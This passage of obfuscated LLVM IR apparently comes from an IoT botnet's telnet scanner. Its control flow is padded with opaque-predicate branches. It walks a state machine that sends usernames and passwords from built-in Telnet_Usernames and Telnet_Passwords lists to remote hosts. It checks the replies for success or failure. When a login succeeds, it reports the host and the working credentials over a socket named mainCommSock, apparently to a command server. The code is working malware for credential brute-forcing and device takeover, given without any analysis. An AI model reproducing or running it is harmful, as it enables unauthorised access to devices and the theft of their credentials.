  br i1 %387, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %388

; <label>:388:                                    ; preds = %originalBBpart232
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 0
  %393 = load i32, i32* %392, align 16
  %394 = srem i32 %393, 64
  %395 = zext i32 %394 to i64
  %396 = shl i64 1, %395
  %397 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %398 = load i32, i32* %6, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 16
  %403 = sdiv i32 %402, 64
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds [16 x i64], [16 x i64]* %397, i64 0, i64 %404
  %406 = load i64, i64* %405, align 8
  %407 = or i64 %406, %396
  store i64 %407, i64* %405, align 8
  %408 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %408, align 8
  %409 = load i32, i32* %3, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %410, i64* %411, align 8
  %412 = load i32, i32* %6, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = add nsw i32 %416, 1
  %418 = call i32 @select(i32 %417, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %418, i32* %7, align 4
  %419 = load i32, i32* %7, align 4
  %420 = icmp eq i32 %419, 1
  br i1 %420, label %421, label %457

; <label>:421:                                    ; preds = %388
  %422 = load i32, i32* %6, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 7
  store i32 0, i32* %425, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %426 = load i32, i32* %6, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 16
  %431 = bitcast i32* %15 to i8*
  %432 = call i32 @getsockopt(i32 %430, i32 1, i32 4, i8* %431, i32* %14) #5
  %433 = load i32, i32* %15, align 4
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %435, label %439

; <label>:435:                                    ; preds = %421
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %437
  call void @reset_telstate(%struct.telstate_t* %438)
  br label %456

; <label>:439:                                    ; preds = %421
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = load i32, i32* %6, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 16
  %450 = call i32 (i32, i32, ...) @fcntl(i32 %449, i32 3, i8* null)
  %451 = and i32 %450, -2049
  %452 = call i32 (i32, i32, ...) @fcntl(i32 %444, i32 4, i32 %451)
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %454
  call void @advance_telstate(%struct.telstate_t* %455, i32 2)
  br label %456

; <label>:456:                                    ; preds = %439, %435
  br label %1330

; <label>:457:                                    ; preds = %388
  %458 = load i32, i32* %7, align 4
  %459 = icmp eq i32 %458, -1
  br i1 %459, label %460, label %464

; <label>:460:                                    ; preds = %457
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %462
  call void @reset_telstate(%struct.telstate_t* %463)
  br label %1330

; <label>:464:                                    ; preds = %457
  br label %465

; <label>:465:                                    ; preds = %464
  %466 = load i32, i32* %6, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  %470 = load i32, i32* %469, align 16
  %471 = add i32 %470, 7
  %472 = zext i32 %471 to i64
  %473 = call i64 @time(i64* null) #5
  %474 = icmp slt i64 %472, %473
  br i1 %474, label %475, label %479

; <label>:475:                                    ; preds = %465
  %476 = load i32, i32* %6, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %477
  call void @reset_telstate(%struct.telstate_t* %478)
  br label %479

; <label>:479:                                    ; preds = %475, %465
  %480 = load i32, i32* @x.71
  %481 = load i32, i32* @y.72
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %479
  %488 = load i32, i32* @x.71
  %489 = load i32, i32* @y.72
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %1313

; <label>:496:                                    ; preds = %106
  %497 = load i32, i32* @x.71
  %498 = load i32, i32* @y.72
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %496
  %505 = load i32, i32* %6, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 0
  %509 = load i32, i32* %508, align 16
  %510 = load i32, i32* %3, align 4
  %511 = load i32, i32* %6, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 9
  %515 = load i8*, i8** %514, align 8
  %516 = call i32 @read_until_response(i32 %509, i32 %510, i8* %515, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %517 = icmp ne i32 %516, 0
  %518 = load i32, i32* @x.71
  %519 = load i32, i32* @y.72
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %517, label %526, label %549

; <label>:526:                                    ; preds = %originalBBpart240
  %527 = call i64 @time(i64* null) #5
  %528 = trunc i64 %527 to i32
  %529 = load i32, i32* %6, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 7
  store i32 %528, i32* %532, align 16
  %533 = load i32, i32* %6, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 9
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @contains_fail(i8* %537)
  %539 = icmp ne i32 %538, 0
  br i1 %539, label %540, label %544

; <label>:540:                                    ; preds = %526
  %541 = load i32, i32* %6, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %542
  call void @advance_telstate(%struct.telstate_t* %543, i32 0)
  br label %548

; <label>:544:                                    ; preds = %526
  %545 = load i32, i32* %6, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %546
  call void @advance_telstate(%struct.telstate_t* %547, i32 3)
  br label %548

; <label>:548:                                    ; preds = %544, %540
  br label %1330

; <label>:549:                                    ; preds = %originalBBpart240
  %550 = load i32, i32* %6, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 7
  %554 = load i32, i32* %553, align 16
  %555 = add i32 %554, 7
  %556 = zext i32 %555 to i64
  %557 = call i64 @time(i64* null) #5
  %558 = icmp slt i64 %556, %557
  br i1 %558, label %559, label %579

; <label>:559:                                    ; preds = %549
  %560 = load i32, i32* @x.71
  %561 = load i32, i32* @y.72
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %559
  %568 = load i32, i32* %6, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %569
  call void @reset_telstate(%struct.telstate_t* %570)
  %571 = load i32, i32* @x.71
  %572 = load i32, i32* @y.72
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %579

; <label>:579:                                    ; preds = %originalBBpart244, %549
  %580 = load i32, i32* @x.71
  %581 = load i32, i32* @y.72
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %579
  %588 = load i32, i32* @x.71
  %589 = load i32, i32* @y.72
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %1313

; <label>:596:                                    ; preds = %106
  %597 = load i32, i32* %6, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 16
  %602 = load i32, i32* %6, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 4
  %606 = load i8, i8* %605, align 2
  %607 = zext i8 %606 to i64
  %608 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %607
  %609 = load i8*, i8** %608, align 8
  %610 = load i32, i32* %6, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 4
  %614 = load i8, i8* %613, align 2
  %615 = zext i8 %614 to i64
  %616 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %615
  %617 = load i8*, i8** %616, align 8
  %618 = call i64 @strlen(i8* %617) #9
  %619 = call i64 @send(i32 %601, i8* %609, i64 %618, i32 16384)
  %620 = icmp slt i64 %619, 0
  br i1 %620, label %621, label %625

; <label>:621:                                    ; preds = %596
  %622 = load i32, i32* %6, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %623
  call void @reset_telstate(%struct.telstate_t* %624)
  br label %1330

; <label>:625:                                    ; preds = %596
  %626 = load i32, i32* %6, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 16
  %631 = call i64 @send(i32 %630, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %632 = icmp slt i64 %631, 0
  br i1 %632, label %633, label %637

; <label>:633:                                    ; preds = %625
  %634 = load i32, i32* %6, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %635
  call void @reset_telstate(%struct.telstate_t* %636)
  br label %1330

; <label>:637:                                    ; preds = %625
  %638 = load i32, i32* %6, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %639
  call void @advance_telstate(%struct.telstate_t* %640, i32 4)
  br label %1313

; <label>:641:                                    ; preds = %106
  %642 = load i32, i32* %6, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = load i32, i32* %3, align 4
  %648 = load i32, i32* %6, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 9
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @read_until_response(i32 %646, i32 %647, i8* %652, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %654 = icmp ne i32 %653, 0
  br i1 %654, label %655, label %678

; <label>:655:                                    ; preds = %641
  %656 = call i64 @time(i64* null) #5
  %657 = trunc i64 %656 to i32
  %658 = load i32, i32* %6, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 7
  store i32 %657, i32* %661, align 16
  %662 = load i32, i32* %6, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 9
  %666 = load i8*, i8** %665, align 8
  %667 = call i32 @contains_fail(i8* %666)
  %668 = icmp ne i32 %667, 0
  br i1 %668, label %669, label %673

; <label>:669:                                    ; preds = %655
  %670 = load i32, i32* %6, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %671
  call void @advance_telstate(%struct.telstate_t* %672, i32 0)
  br label %677

; <label>:673:                                    ; preds = %655
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %675
  call void @advance_telstate(%struct.telstate_t* %676, i32 5)
  br label %677

; <label>:677:                                    ; preds = %673, %669
  br label %1330

; <label>:678:                                    ; preds = %641
  %679 = load i32, i32* @x.71
  %680 = load i32, i32* @y.72
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %678
  %687 = load i32, i32* %6, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 7
  %691 = load i32, i32* %690, align 16
  %692 = add i32 %691, 7
  %693 = zext i32 %692 to i64
  %694 = call i64 @time(i64* null) #5
  %695 = icmp slt i64 %693, %694
  %696 = load i32, i32* @x.71
  %697 = load i32, i32* @y.72
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBBpart261, label %originalBB50alteredBB

originalBBpart261:                                ; preds = %originalBB50
  br i1 %695, label %704, label %708

; <label>:704:                                    ; preds = %originalBBpart261
  %705 = load i32, i32* %6, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %706
  call void @reset_telstate(%struct.telstate_t* %707)
  br label %708

; <label>:708:                                    ; preds = %704, %originalBBpart261
  br label %1313

; <label>:709:                                    ; preds = %106
  %710 = load i32, i32* %6, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 0
  %714 = load i32, i32* %713, align 16
  %715 = load i32, i32* %6, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 5
  %719 = load i8, i8* %718, align 1
  %720 = zext i8 %719 to i64
  %721 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %720
  %722 = load i8*, i8** %721, align 8
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 5
  %727 = load i8, i8* %726, align 1
  %728 = zext i8 %727 to i64
  %729 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %728
  %730 = load i8*, i8** %729, align 8
  %731 = call i64 @strlen(i8* %730) #9
  %732 = call i64 @send(i32 %714, i8* %722, i64 %731, i32 16384)
  %733 = icmp slt i64 %732, 0
  br i1 %733, label %734, label %738

; <label>:734:                                    ; preds = %709
  %735 = load i32, i32* %6, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %736
  call void @reset_telstate(%struct.telstate_t* %737)
  br label %1330

; <label>:738:                                    ; preds = %709
  %739 = load i32, i32* %6, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = call i64 @send(i32 %743, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %745 = icmp slt i64 %744, 0
  br i1 %745, label %746, label %750

; <label>:746:                                    ; preds = %738
  %747 = load i32, i32* %6, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %748
  call void @reset_telstate(%struct.telstate_t* %749)
  br label %1330

; <label>:750:                                    ; preds = %738
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %752
  call void @advance_telstate(%struct.telstate_t* %753, i32 6)
  br label %1313

; <label>:754:                                    ; preds = %106
  %755 = load i32, i32* %6, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 0
  %759 = load i32, i32* %758, align 16
  %760 = load i32, i32* %3, align 4
  %761 = load i32, i32* %6, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 9
  %765 = load i8*, i8** %764, align 8
  %766 = call i32 @read_until_response(i32 %759, i32 %760, i8* %765, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %767 = icmp ne i32 %766, 0
  br i1 %767, label %768, label %887

; <label>:768:                                    ; preds = %754
  %769 = call i64 @time(i64* null) #5
  %770 = trunc i64 %769 to i32
  %771 = load i32, i32* %6, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 7
  store i32 %770, i32* %774, align 16
  %775 = load i32, i32* %6, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 9
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 @contains_fail(i8* %779)
  %781 = icmp ne i32 %780, 0
  br i1 %781, label %782, label %786

; <label>:782:                                    ; preds = %768
  %783 = load i32, i32* %6, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %784
  call void @advance_telstate(%struct.telstate_t* %785, i32 0)
  br label %886

; <label>:786:                                    ; preds = %768
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 9
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @contains_success(i8* %791)
  %793 = icmp ne i32 %792, 0
  br i1 %793, label %794, label %849

; <label>:794:                                    ; preds = %786
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 3
  %799 = load i8, i8* %798, align 1
  %800 = zext i8 %799 to i32
  %801 = icmp eq i32 %800, 2
  br i1 %801, label %802, label %806

; <label>:802:                                    ; preds = %794
  %803 = load i32, i32* %6, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %804
  call void @advance_telstate(%struct.telstate_t* %805, i32 7)
  br label %832

; <label>:806:                                    ; preds = %794
  %807 = load i32, i32* @mainCommSock, align 4
  %808 = load i32, i32* %6, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %809
  %811 = call i8* @get_telstate_host(%struct.telstate_t* %810)
  %812 = load i32, i32* %6, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 4
  %816 = load i8, i8* %815, align 2
  %817 = zext i8 %816 to i64
  %818 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %817
  %819 = load i8*, i8** %818, align 8
  %820 = load i32, i32* %6, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 5
  %824 = load i8, i8* %823, align 1
  %825 = zext i8 %824 to i64
  %826 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %825
  %827 = load i8*, i8** %826, align 8
  %828 = call i32 (i32, i8*, ...) @sockprintf(i32 %807, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %811, i8* %819, i8* %827)
  %829 = load i32, i32* %6, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %830
  call void @advance_telstate(%struct.telstate_t* %831, i32 7)
  br label %832

; <label>:832:                                    ; preds = %806, %802
  %833 = load i32, i32* @x.71
  %834 = load i32, i32* @y.72
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %832
  %841 = load i32, i32* @x.71
  %842 = load i32, i32* @y.72
  %843 = sub i32 %841, 1
  %844 = mul i32 %841, %843
  %845 = urem i32 %844, 2
  %846 = icmp eq i32 %845, 0
  %847 = icmp slt i32 %842, 10
  %848 = or i1 %846, %847
  br i1 %848, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %869

; <label>:849:                                    ; preds = %786
  %850 = load i32, i32* @x.71
  %851 = load i32, i32* @y.72
  %852 = sub i32 %850, 1
  %853 = mul i32 %850, %852
  %854 = urem i32 %853, 2
  %855 = icmp eq i32 %854, 0
  %856 = icmp slt i32 %851, 10
  %857 = or i1 %855, %856
  br i1 %857, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %849
  %858 = load i32, i32* %6, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %859
  call void @reset_telstate(%struct.telstate_t* %860)
  %861 = load i32, i32* @x.71
  %862 = load i32, i32* @y.72
  %863 = sub i32 %861, 1
  %864 = mul i32 %861, %863
  %865 = urem i32 %864, 2
  %866 = icmp eq i32 %865, 0
  %867 = icmp slt i32 %862, 10
  %868 = or i1 %866, %867
  br i1 %868, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %869

; <label>:869:                                    ; preds = %originalBBpart269, %originalBBpart265
  %870 = load i32, i32* @x.71
  %871 = load i32, i32* @y.72
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %869
  %878 = load i32, i32* @x.71
  %879 = load i32, i32* @y.72
  %880 = sub i32 %878, 1
  %881 = mul i32 %878, %880
  %882 = urem i32 %881, 2
  %883 = icmp eq i32 %882, 0
  %884 = icmp slt i32 %879, 10
  %885 = or i1 %883, %884
  br i1 %885, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %886

; <label>:886:                                    ; preds = %originalBBpart273, %782
  br label %1330

; <label>:887:                                    ; preds = %754
  %888 = load i32, i32* %6, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %889
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %890, i32 0, i32 7
  %892 = load i32, i32* %891, align 16
  %893 = add i32 %892, 7
  %894 = zext i32 %893 to i64
  %895 = call i64 @time(i64* null) #5
  %896 = icmp slt i64 %894, %895
  br i1 %896, label %897, label %901

; <label>:897:                                    ; preds = %887
  %898 = load i32, i32* %6, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %899
  call void @reset_telstate(%struct.telstate_t* %900)
  br label %901

; <label>:901:                                    ; preds = %897, %887
  %902 = load i32, i32* @x.71
  %903 = load i32, i32* @y.72
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %901
